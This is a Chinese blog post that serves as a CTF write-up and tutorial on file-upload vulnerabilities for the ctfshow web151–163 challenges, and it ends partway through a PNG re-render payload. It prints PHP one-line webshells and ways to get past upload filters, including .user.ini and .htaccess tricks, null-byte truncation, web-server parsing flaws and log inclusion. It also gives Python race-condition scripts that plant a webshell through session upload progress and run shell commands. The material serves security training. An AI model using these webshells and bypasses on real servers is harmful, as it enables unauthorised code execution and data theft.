<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>文件上传&#43;CTF题目 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="文件上传&#43;CTF题目" />
<meta property="og:description" content="文章目录 概念：路径的关系一句话木马 文件上传绕过：1.绕过js代码：2.绕过服务端（MIME类型）3.绕过黑名单绕过白名单图片马文件上传后利用蚁剑进行连接后门 CTFshow客户端验证前端js验证CTFshow-web157 服务端验证文件头content-type字段校验（image/gif）ctfshow-web152文件内容头校验（GIF89a）后缀名黑名单校验后缀名白名单校验 重点：利用.user.ini配置文件进行绕过ctfshow153 利用.htaccess来绕过CTF题目 路径截断绕过与普通截断绕过（验证后缀名）短标签绕过web154，155web156web157，158，159160 操作系统解析漏洞绕过windowslinux CMS,编辑器漏洞重点：服务器解析漏洞iis漏洞apachenginxtomacat session文件包含绕过session与cookie的区别文件上传加条件竞争web162，163 二次渲染PNG二次渲染jpg二次渲染 概念： web客户端在上传文件时，没有对上传文件的内容，扩展名等进行过滤。
路径的关系 区别相对路径中一些符号表示 ../表示上一目录 ./表示当前目录 /表示根目录 一句话木马 1.&lt;?php eval($_POST[1]);?&gt; 2.&lt;script language=&#39;php&#39;&gt;eval($_POST[1]);&lt;/script&gt; 3.&lt;?php fputs(fopen(&#34;shell.php&#34;,&#34;w&#34;),&#34;&lt;?php eval($_POST[1]);?&gt;&#34;)?&gt; 文件上传绕过： 1.绕过js代码： （1）一般的web网页前端在上传文件时，都会利用js代码对文件的扩展名。也就是说，如果对文件的扩展名进行过滤了，可能是js代码的作用了。
（2）方法:
利用火狐的&#34;about：config&#34;来禁用js代码执行。 先使用可以使用的扩展名进行上传，利用bp抓包，改数据包扩展名，再放包。 2.绕过服务端（MIME类型） （1）服务端是在数据包传输过去后再进行响应，所以不能通过绕过js的方法，进行绕过
（2）一般是通过查看http上传的文件的Content-type来进行检测。
（3）方法：bp改变数据包，将数据包的content-type进行改变为合法的内容。
（4）一般合法的content-type：
超文本标记语言.html:text/html 普通文本.txt文件：text/plain PDF文件：application/pdf word文档：application/msword png/gif：application/png/gif .avi:video/msavi 3.绕过黑名单 1. 通过改变后缀大小写的方式来进行绕过 2. 通过双写来绕过：如果代码中对扩展名直接解析过滤为空格，说明就可以通过绕过。 3. 可以将php写成php5,php7，phtml等没有在黑名单的后缀 4. 可以在末尾加上 “空格” 5. 加末尾加上点`.` 6. 加上`::$DATA ` 7. 空格，点，::$DATA相结合 绕过白名单 所谓白名单，只允许一些合法的jpg通过 可以采用%00截断来截断字符，可以绕过
1.php%00.jpg 图片马 windows制造图片马：
copy 1.png \b &#43; 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/95f25aa4dae48363e1e87ddd0bb99595/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-22T22:24:59+08:00" />
<meta property="article:modified_time" content="2022-02-22T22:24:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">文件上传&#43;CTF题目</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#_1" rel="nofollow">概念：</a></li><li><ul><li><a href="#_3" rel="nofollow">路径的关系</a></li><li><a href="#_10" rel="nofollow">一句话木马</a></li></ul> 
   </li><li><a href="#_16" rel="nofollow">文件上传绕过：</a></li><li><ul><li><a href="#1js_17" rel="nofollow">1.绕过js代码：</a></li><li><a href="#2MIME_24" rel="nofollow">2.绕过服务端（MIME类型）</a></li><li><a href="#3_37" rel="nofollow">3.绕过黑名单</a></li><li><a href="#_47" rel="nofollow">绕过白名单</a></li><li><a href="#_53" rel="nofollow">图片马</a></li><li><a href="#_58" rel="nofollow">文件上传后利用蚁剑进行连接后门</a></li></ul> 
   </li><li><a href="#CTFshow_64" rel="nofollow">CTFshow</a></li><li><ul><li><a href="#_65" rel="nofollow">客户端验证</a></li><li><ul><li><a href="#js_66" rel="nofollow">前端js验证</a></li><li><a href="#CTFshowweb157_75" rel="nofollow">CTFshow-web157</a></li></ul> 
    </li><li><a href="#_82" rel="nofollow">服务端验证</a></li><li><ul><li><a href="#contenttypeimagegif_83" rel="nofollow">文件头content-type字段校验（image/gif）</a></li><li><a href="#ctfshowweb152_85" rel="nofollow">ctfshow-web152</a></li><li><a href="#GIF89a_87" rel="nofollow">文件内容头校验（GIF89a）</a></li><li><a href="#_95" rel="nofollow">后缀名黑名单校验</a></li><li><a href="#_105" rel="nofollow">后缀名白名单校验</a></li></ul> 
    </li><li><a href="#userini_107" rel="nofollow">重点：利用.user.ini配置文件进行绕过</a></li><li><ul><li><a href="#ctfshow153_123" rel="nofollow">ctfshow153</a></li></ul> 
    </li><li><a href="#htaccess_132" rel="nofollow">利用.htaccess来绕过</a></li><li><ul><li><a href="#CTF_133" rel="nofollow">CTF题目</a></li></ul> 
    </li><li><a href="#_136" rel="nofollow">路径截断绕过与普通截断绕过（验证后缀名）</a></li><li><a href="#_145" rel="nofollow">短标签绕过</a></li><li><ul><li><a href="#web154155_159" rel="nofollow">web154，155</a></li><li><a href="#web156_163" rel="nofollow">web156</a></li><li><a href="#web157158159_169" rel="nofollow">web157，158，159</a></li><li><a href="#160_180" rel="nofollow">160</a></li></ul> 
    </li><li><a href="#_194" rel="nofollow">操作系统解析漏洞绕过</a></li><li><ul><li><a href="#windows_195" rel="nofollow">windows</a></li><li><a href="#linux_204" rel="nofollow">linux</a></li></ul> 
    </li><li><a href="#CMS_208" rel="nofollow">CMS,编辑器漏洞</a></li><li><a href="#_215" rel="nofollow">重点：服务器解析漏洞</a></li><li><ul><li><a href="#iis_220" rel="nofollow">iis漏洞</a></li><li><a href="#apache_226" rel="nofollow">apache</a></li><li><a href="#nginx_241" rel="nofollow">nginx</a></li><li><a href="#tomacat_244" rel="nofollow">tomacat</a></li></ul> 
    </li><li><a href="#session_246" rel="nofollow">session文件包含绕过</a></li><li><ul><li><a href="#sessioncookie_247" rel="nofollow">session与cookie的区别</a></li><li><a href="#_259" rel="nofollow">文件上传加条件竞争</a></li><li><a href="#web162163_338" rel="nofollow">web162，163</a></li></ul> 
    </li><li><a href="#_379" rel="nofollow">二次渲染</a></li><li><ul><li><a href="#PNG_384" rel="nofollow">PNG二次渲染</a></li><li><a href="#jpg_414" rel="nofollow">jpg二次渲染</a></li></ul> 
   </li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="_1"></a>概念：</h3> 
<p>web客户端在上传文件时，没有对上传文件的内容，扩展名等进行过滤。</p> 
<h4><a id="_3"></a>路径的关系</h4> 
<pre><code>区别相对路径中一些符号表示
../表示上一目录
./表示当前目录
/表示根目录
</code></pre> 
<h4><a id="_10"></a>一句话木马</h4> 
<pre><code>1.&lt;?php eval($_POST[1]);?&gt;
2.&lt;script language='php'&gt;eval($_POST[1]);&lt;/script&gt;
3.&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[1]);?&gt;")?&gt;
</code></pre> 
<h3><a id="_16"></a>文件上传绕过：</h3> 
<h4><a id="1js_17"></a>1.绕过js代码：</h4> 
<p>（1）一般的web网页前端在上传文件时，都会利用js代码对文件的扩展名。也就是说，如果对文件的扩展名进行过滤了，可能是js代码的作用了。<br> （2）方法:</p> 
<pre><code>利用火狐的"about：config"来禁用js代码执行。
先使用可以使用的扩展名进行上传，利用bp抓包，改数据包扩展名，再放包。
</code></pre> 
<h4><a id="2MIME_24"></a>2.绕过服务端（MIME类型）</h4> 
<p>（1）服务端是在数据包传输过去后再进行响应，所以不能通过绕过js的方法，进行绕过<br> （2）一般是通过查看http上传的文件的<code>Content-type</code>来进行检测。<br> （3）方法：bp改变数据包，将数据包的content-type进行改变为合法的内容。<br> （4）一般合法的content-type：</p> 
<pre><code>超文本标记语言.html:text/html
普通文本.txt文件：text/plain
PDF文件：application/pdf
word文档：application/msword
png/gif：application/png/gif
.avi:video/msavi
</code></pre> 
<h4><a id="3_37"></a>3.绕过黑名单</h4> 
<pre><code>1. 通过改变后缀大小写的方式来进行绕过
2. 通过双写来绕过：如果代码中对扩展名直接解析过滤为空格，说明就可以通过绕过。
3. 可以将php写成php5,php7，phtml等没有在黑名单的后缀
4. 可以在末尾加上 “空格”
5. 加末尾加上点`.`
6. 加上`::$DATA `
7. 空格，点，::$DATA相结合
</code></pre> 
<h4><a id="_47"></a>绕过白名单</h4> 
<p>所谓白名单，只允许一些合法的jpg通过 <br> 可以采用<code>%00截断</code>来截断字符，可以绕过</p> 
<pre><code>1.php%00.jpg
</code></pre> 
<h4><a id="_53"></a>图片马</h4> 
<p>windows制造图片马：</p> 
<pre><code>copy 1.png \b + 2.php \a shell.png
</code></pre> 
<h4><a id="_58"></a>文件上传后利用蚁剑进行连接后门</h4> 
<p>条件</p> 
<pre><code>1.需要文件的路径，一般为/upload/1.php
2.传入木马
</code></pre> 
<h3><a id="CTFshow_64"></a>CTFshow</h3> 
<h4><a id="_65"></a>客户端验证</h4> 
<h5><a id="js_66"></a>前端js验证</h5> 
<p><img src="https://images2.imgbox.com/29/e6/j9K16z49_o.png" alt="在这里插入图片描述"><br> 原理：<br> 一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br> 判断方式：<br> 在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。<br> 绕过姿势：<br> 1.关闭浏览器js，火狐是输入框输入about:config<br> 2.先上传png文件，然后burp抓包，改后缀名，即可成功上传木马</p> 
<h5><a id="CTFshowweb157_75"></a>CTFshow-web157</h5> 
<ol><li>上传png文件，burp抓包，改后缀，放包</li><li>方法一 蚁剑连接<br> <img src="https://images2.imgbox.com/65/77/UYsBjEkP_o.png" alt="在这里插入图片描述"><br> 方法二，利用命令执行，直接访问upload/1.php,然后 post传1=system(‘tac …/f*’); flag在当前文件所在位置的上一层。<br> <img src="https://images2.imgbox.com/75/53/A3ntqTet_o.png" alt="在这里插入图片描述"></li></ol> 
<h4><a id="_82"></a>服务端验证</h4> 
<h5><a id="contenttypeimagegif_83"></a>文件头content-type字段校验（image/gif）</h5> 
<p>绕过姿势：上传php文件burp抓包，然后改文件头content-type即可</p> 
<h5><a id="ctfshowweb152_85"></a>ctfshow-web152</h5> 
<p>方法跟web151一样的</p> 
<h5><a id="GIF89a_87"></a>文件内容头校验（GIF89a）</h5> 
<p>绕过姿势：在文件中加一个GIF89a这种即可</p> 
<pre><code>（1） .JPEG:.JPE;.JPG，”JPGGraphic File”
（2） .gif:”GIF 89A”
（3） .zip:”Zip Compressed”
（4） .doc;.xls;.xlt;.ppt;.apr:”MS Compound Document v1 or Lotus Approach APRfile”
</code></pre> 
<h5><a id="_95"></a>后缀名黑名单校验</h5> 
<p>绕过姿势：<br> （1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br> （2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br> 能被解析的文件扩展名列表：<br> jsp jspx jspf<br> asp asa cer aspx<br> php php php3 php4<br> exe exee<br> phtml php3 php4 php5 Php php (空格) php.，pphphp</p> 
<h5><a id="_105"></a>后缀名白名单校验</h5> 
<p>绕过姿势：跟黑名单检测一样的，只需要改变后缀名</p> 
<h4><a id="userini_107"></a>重点：利用.user.ini配置文件进行绕过</h4> 
<p>.user.ini是什么？</p> 
<pre><code>.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取。
</code></pre> 
<p>官方文档</p> 
<pre><code>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。
除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。
在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。
</code></pre> 
<p>也就是说当web目录中有.user.ini，php会优先执行里面的配置。<br> 也就是里面除了PHP_INI_SYSTEM模式的配置以外都可以在.user.ini中进行重写。<br> 那么我们就去找我们需要用到配置<br> 发现<code>auto_append_file</code>和<code>auto_prepend_file</code><br> 一个相当于在每个php<code>文件尾</code>加上 include(“xxxx”)，一个相当于<code>文件头</code>加上 include(“xxx”)</p> 
<h5><a id="ctfshow153_123"></a>ctfshow153</h5> 
<ol><li>先上传一个带有木马的png文件，然后上传.user.ini文件<br> <img src="https://images2.imgbox.com/d8/6b/Apc9Z65F_o.png" alt="在这里插入图片描述"><br> 重写.user.ini，并利用auto-append-file=xxx(文件路径)，来包含文件<br> <img src="https://images2.imgbox.com/c8/bc/VapDAOLG_o.png" alt="在这里插入图片描述"><br> 然后木马上传成功后，方法就一样了<br> <img src="https://images2.imgbox.com/4d/c1/Fkgm9C1O_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/29/94/Q6sAjoFv_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/b5/1b/UiH8P47v_o.png" alt="在这里插入图片描述"></li></ol> 
<h4><a id="htaccess_132"></a>利用.htaccess来绕过</h4> 
<h5><a id="CTF_133"></a>CTF题目</h5> 
<p>https://blog.csdn.net/unexpectedthing/article/details/121026007<br> <a href="https://y4tacker.blog.csdn.net/article/details/116666720?spm=1001.2014.3001.5502" rel="nofollow">关于htaccess的拓展</a></p> 
<h4><a id="_136"></a>路径截断绕过与普通截断绕过（验证后缀名）</h4> 
<p>上传图片马（可以在图片马头加GIF89a），发现有保存路径<br> 成功的条件：php版本小于5.3.4<br> php的magic_quotes_gpc=off<br> 可能为路径截断绕过(常用的就是00截断)<br> 1、Get:在上传路径处…/upload/1.php%00<br> 2、Post:对…/upload/1.php后进行16进制hex修改为00<br> 3、还有一种非路径截断，上传图片马（视情况加GIF89a）<br> 抓包修改为：1.php;jpg或者1.php%00.jpg或者1.php/00.jpg</p> 
<h4><a id="_145"></a>短标签绕过</h4> 
<pre><code>1. &lt;?php  echo ('123')    ?&gt;  ---- 常规写法
不需要开启参数设置
2.  &lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;
注：
     利用短标签写法可以绕过一些对php字符的过滤
     Windows环境中短标签默认是打开的，Linux下 默认是关闭的。
     控制参数： php支持短标签，需要我们把short_open_tag 设置为On.
3.  &lt;%  echo '123'    %&gt;
注：需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。
4.  &lt;script language=”php”&gt; echo '123' &lt;/script&gt;
不需要修改参数开关，但是只能在7.0以下可用。
</code></pre> 
<h5><a id="web154155_159"></a>web154，155</h5> 
<p>过滤了php或者？这些，就使用短标签</p> 
<ol><li>将图片马的内容改成上面的东西</li><li>然后传.user.ini，即可上传木马成功。</li></ol> 
<h5><a id="web156_163"></a>web156</h5> 
<p>一句话木马</p> 
<pre><code class="prism language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>过滤了[]，在前两题的基础上把[] 换成{}</p> 
<h5><a id="web157158159_169"></a>web157，158，159</h5> 
<p>过滤了分号、{}、system()等(不同题过滤的不一样)，所以直接构造命令执行即可</p> 
<pre><code class="prism language-python"><span class="token operator">&lt;</span>?<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'tac ../f*'</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>?<span class="token operator">=</span>`tac <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>f<span class="token operator">*</span>`?<span class="token operator">&gt;</span>
</code></pre> 
<p>然后最后访问/upload/index.php<br> 为什么要访问index.php</p> 
<pre><code>我的理解就是在upload下面有个index.php的文件，它的回显是nothing here，当访问index.php，会启动php，优先解析.user.ini的配置，然后包含了文件，就触发了1.png图片马的内容，执行命令函数
</code></pre> 
<h5><a id="160_180"></a>160</h5> 
<p>过滤了括号反引号还有一些关键字<br> 利用日志包含绕过，图片内容&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?&gt;</p> 
<pre><code>在php代码中，可以使用点号来进行字符串的拼接。因为log被过滤了。所以用拼接绕过
</code></pre> 
<p>日志包含，<a href="https://blog.csdn.net/unexpectedthing/article/details/117457380">可以看我这篇文章</a></p> 
<p>上传完.user.ini和图片后<br> 访问网站然后修改User-Agent头信息，UA可以是直接得到flag，也可以传一句话木马</p> 
<p>原理就是：当访问index.php,触发了.user.ini,再到图片马的东西，再到日志文件去找。</p> 
<p><img src="https://images2.imgbox.com/96/ba/Q93SVvTo_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_194"></a>操作系统解析漏洞绕过</h4> 
<h5><a id="windows_195"></a>windows</h5> 
<pre><code>win服务器比较难报出来，一般是知道它的绝对路径特点，有盘符可能为win   二是利用错误文件报错如正确为index.php,改为错误的1index.php 或者index.xxxx,如果报错服务器中间件信息为iis那它是win服务器）
绕过：
1、上传1.php(或者图片马)，抓包改为1.php.
2、上传1.php(或者图片马)，抓包改为1.php::$DATA
3、上传1.php(或者图片马)，抓包改为1.php:1.jpg
4、上传1.php(或者图片马)，抓包改为1.php::$DATA…….
</code></pre> 
<h5><a id="linux_204"></a>linux</h5> 
<pre><code>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。
</code></pre> 
<h4><a id="CMS_208"></a>CMS,编辑器漏洞</h4> 
<pre><code>6.CMS、编辑器漏洞
（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。
（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。
这两方面的漏洞以后单独成文汇总，这里点到为止
</code></pre> 
<h4><a id="_215"></a>重点：服务器解析漏洞</h4> 
<pre><code>好的文章
https://blog.csdn.net/Fly_hps/article/details/80781571
</code></pre> 
<h5><a id="iis_220"></a>iis漏洞</h5> 
<p>上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以<br> 上传图片马抓包，修改后缀为.asa、.cer和.cdx等，当然不检测内容和类型是直接上传也可以<br> 上传图片马，抓包发现有保存图片的路径，如…/upload/image<br> 我们修改路劲为…/upload/image/1.asp<br> (然后就会存在…/upload/image/1.asp/目录，在这个目录下任何文件当作asp文件解析) iis7.0也存在这漏洞</p> 
<h5><a id="apache_226"></a>apache</h5> 
<p>绕过：利用了apache从右向左解析漏洞<br> 1、上传图片马，bp抓包为1.php.xxxx.abc<br> 2、上传.htaccess文件（内容：SetHandler application/x-httpd-php<br> ）（如果允许上传），再上传图片马<br> Ps:如果能上传.htacess文件，但不能解析，可以试试下面</p> 
<pre><code>&lt;FilesMatch "filename"&gt;
 
SetHandler application/x-httpd-php
 
&lt;/FilesMatch&gt;
</code></pre> 
<p>Filename 为你想要上传的文件后缀名。如jpg<br> 然后我们再上传1.jpg图片马即可</p> 
<h5><a id="nginx_241"></a>nginx</h5> 
<p>上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析<br> 如/upload/image/1.jpg/.php</p> 
<h5><a id="tomacat_244"></a>tomacat</h5> 
<p>一般为肉口令进入tomcat后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p> 
<h4><a id="session_246"></a>session文件包含绕过</h4> 
<h5><a id="sessioncookie_247"></a>session与cookie的区别</h5> 
<pre><code>Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；
Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。
两者的区别：
1，session 在服务器端，cookie 在客户端（浏览器）
2，session 默认被存在在服务器的一个文件里（不是内存）
3，session 的运行依赖 session id，而 session id 是存在 cookie 中的，也就是说，如果浏览器禁用了 cookie ，同时 session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id）
4，session 可以放在 文件、数据库、或内存中都可以。
5，用户验证这种场合一般会用 session
6，cookie存储session_id，然后用户验证找cookie，cookie的sessionid到服务端，就可以实现用户验证。
</code></pre> 
<h5><a id="_259"></a>文件上传加条件竞争</h5> 
<p>这个是利用session来传入木马，实现控制<br> 脚本</p> 
<pre><code>import requests
import threading
import sys
session=requests.session()
sess='yu22x'
url1="http://05b536c9-c839-4df4-80a9-ddbc1ddeb979.challenge.ctf.show:8080/"
url2='http://05b536c9-c839-4df4-80a9-ddbc1ddeb979.challenge.ctf.show:8080?file=/tmp/sess_'+sess
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[1]);?&gt;'
}
data2={
	'1':'system("cat f*");'
}
file={
	'file':'abc'
}
cookies={
	'PHPSESSID': sess
}
def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.post(url2,data=data2)
		if 'ctfshow{' in r.text:
			print(r.text)
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()
</code></pre> 
<ol><li>原理</li></ol> 
<pre><code>通过将恶意代码传入session中，进行文件包含，就达到了传webshell
</code></pre> 
<ol start="2"><li>利用条件</li></ol> 
<pre><code> 需要找到session的可控变量,知道session的存储路径
php的session文件可以在phpinfo的session.save_path看到
常见的session存储路径
/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到
</code></pre> 
<ol start="3"><li>session工作原理：</li></ol> 
<pre><code>session_start():
session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。
 当执行php脚本时，通过使用session超全局变量注册session变量
 当脚本结束后，未被销毁的session变量，同时创建一个sess_abc123（名称随机）的session文件，同时abc123作为phpsessionid的cookie值返回到浏览器
</code></pre> 
<p>文献：<br> https://www.freebuf.com/vuls/202819.html<br> 4. 传入恶意代码主要用到php中的session.upload_progress</p> 
<pre><code>这个功能版本是php5.4
1. session.upload_progress.enabled = on
2. session.upload_progress.cleanup = on
3. session.upload_progress.prefix = "upload_progress_"
4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
5. session.upload_progress.freq = "1%"
6. session.upload_progress.min_freq = "1"

前四个配置选项功能
enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；
cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；
name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；
prefix+name将表示为session中的键名
</code></pre> 
<p>这四个功能导致文件内容上传后，session的值马上就被清除了。<br> 就需要条件竞争。</p> 
<h5><a id="web162163_338"></a>web162，163</h5> 
<ol><li>先传.user.ini和png文件，让文件包含SESSION文件<br> <img src="https://images2.imgbox.com/54/fa/BKfmeXlk_o.png" alt=""><img src="https://images2.imgbox.com/32/ad/pQP6gjmI_o.png" alt="在这里插入图片描述"></li><li>访问触发了.user.ini和png</li><li>因为需要在php删除session之前，所以需要条件竞争</li></ol> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading
<span class="token comment"># session保持</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
sess <span class="token operator">=</span> <span class="token string">'zzy'</span> <span class="token comment">#上传文件的PHPSESSION的ID</span>
url1 <span class="token operator">=</span> <span class="token string">"http://f32d7187-3bbe-43f8-b497-0c97b499168c.challenge.ctf.show:8080/"</span>
url2 <span class="token operator">=</span> <span class="token string">"http://f32d7187-3bbe-43f8-b497-0c97b499168c.challenge.ctf.show:8080/upload/"</span>
data1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php system("tac ../f*");?&gt;'</span><span class="token comment"># 传入的恶意代码</span>
<span class="token punctuation">}</span>
<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token string">'zzy'</span>
<span class="token punctuation">}</span>
cookies <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess
<span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span>
           threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>
    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h4><a id="_379"></a>二次渲染</h4> 
<p>文献</p> 
<pre><code>1. https://www.fujieace.com/penetration-test/upload-labs-pass-16.html
</code></pre> 
<h5><a id="PNG_384"></a>PNG二次渲染</h5> 
<pre><code class="prism language-python"><span class="token operator">&lt;</span>?php
$p <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
